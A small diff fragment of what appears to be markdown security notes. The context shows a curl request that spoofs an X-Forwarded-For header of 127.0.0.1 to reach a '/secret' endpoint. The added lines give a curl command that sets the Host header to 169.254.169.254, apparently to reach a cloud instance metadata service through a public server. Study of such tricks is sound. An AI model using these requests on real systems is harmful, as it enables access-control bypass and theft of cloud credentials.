@@ -26,3 +26,6 @@ curl -H 'X-FORWARDED-FOR 127.0.0.1' http://127.0.0.1:5000/secret
 
 https://youtu.be/PvpXRBor-Jw?t=206
 
+```
+curl http://<public IP>/latest/ -H "Host:169.254.169.254"
+```
